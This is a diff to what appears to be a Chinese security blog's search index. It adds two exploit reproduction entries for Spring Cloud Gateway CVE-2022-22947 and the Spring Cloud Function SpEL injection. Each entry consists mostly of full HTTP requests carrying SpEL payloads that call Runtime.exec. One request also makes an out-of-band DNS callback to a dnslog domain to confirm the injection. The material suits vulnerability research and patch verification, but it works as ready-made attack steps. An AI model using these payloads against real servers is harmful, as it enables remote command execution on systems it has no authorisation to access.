@@ -119,6 +119,49 @@
       </tags>
   </entry>
   <entry>
+    <title>Spring Cloud Gateway Actuator API SpEL表达式注入命令执行-CVE-2022-22947</title>
+    <url>/2022/03/30/Spring%20Cloud%20Gateway%20Actuator%20API%20SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
+    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><hr>
+<p>Spring Cloud Gateway是Spring中的一个API网关。其3.1.0及3.0.6版本（包含）以前存在一处SpEL表达式注入漏洞，当攻击者可以访问Actuator API的情况下，将可以利用该漏洞执行任意命令。</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Spring Cloud Gateway &lt; 3.1.0</p>
+<p>Spring Cloud Gateway &lt; 3.0.7</p>
+<p>Spring Cloud Gateway 其他已不再更新版本</p>
+<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><ol>
+<li>添加包含恶意SpEL表达式的路由：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/gateway/routes/hacktest HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8080</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 329</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;id&quot;: &quot;hacktest&quot;,</span><br><span class="line">  &quot;filters&quot;: [&#123;</span><br><span class="line">    &quot;name&quot;: &quot;AddResponseHeader&quot;,</span><br><span class="line">    &quot;args&quot;: &#123;</span><br><span class="line">      &quot;name&quot;: &quot;Result&quot;,</span><br><span class="line">      &quot;value&quot;: &quot;#&#123;new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&#123;\&quot;id\&quot;&#125;).getInputStream()))&#125;&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;],</span><br><span class="line">  &quot;uri&quot;: &quot;http://example.com&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>刷新路由</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/gateway/refresh HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8080</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>访问创建的路由</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /actuator/gateway/routes/hacktest HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8080</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: application/x-www-form-urlencoded</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/04/03/UEJWBiGQaDtMbeT.png" alt="image-20220330205133211"></p>
+<ol start="4">
+<li>删除创建的路由</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DELETE /actuator/gateway/routes/hacktest HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+
+<ol start="5">
+<li>再次刷新</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/gateway/refresh HTTP/1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure>
+
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/vulhub/vulhub/blob/master/spring/CVE-2022-22947/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/spring/CVE-2022-22947/README.zh-cn.md</a></p>
+]]></content>
+      <categories>
+        <category>漏洞利用</category>
+      </categories>
+      <tags>
+        <tag>Spring Cloud Gateway</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Sqlmap tamper</title>
     <url>/2022/03/28/sqlmap_tamper/</url>
     <content><![CDATA[<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><ul>
@@ -157,6 +200,26 @@
       </categories>
       <tags>
         <tag>Sqlmap</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Spring-Cloud-Function-SpEL-RCE</title>
+    <url>/2022/03/30/Spring-Cloud-Function-SpEL-RCE/</url>
+    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Spring Cloud Function 是基于Spring Boot 的函数计算框架，它抽象出所有传输细节和基础架构，允许开发人员保留所有熟悉的工具和流程，并专注于业务逻辑。</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>3.0.0.RELEASE &lt;&#x3D; Spring Cloud Function &lt;&#x3D; 3.2.2</p>
+<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /functionRouter HTTP/1.1</span><br><span class="line">host:127.0.0.1:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15</span><br><span class="line">Connection: close</span><br><span class="line">spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;)</span><br><span class="line">Content-Length: 5</span><br><span class="line"></span><br><span class="line">123</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/04/03/ZkqtToNXg9W8BLD.png" alt="image-20220403232403602"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /functionRouter HTTP/1.1</span><br><span class="line">host:127.0.0.1:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15</span><br><span class="line">Connection: close</span><br><span class="line">spring.cloud.function.routing-expression:T(java.net.InetAddress).getByName(&quot;81731h.dnslog.cn&quot;)</span><br><span class="line">Content-Length: 3</span><br><span class="line"></span><br><span class="line">123</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/04/03/m6fvrOawhydJ7tC.png" alt="image-20220403232423476"></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/hktalent/spring-spel-0day-poc">https://github.com/hktalent/spring-spel-0day-poc</a></p>
+]]></content>
+      <categories>
+        <category>漏洞利用</category>
+      </categories>
+      <tags>
+        <tag>Spring Cloud Function</tag>
       </tags>
   </entry>
 </search>
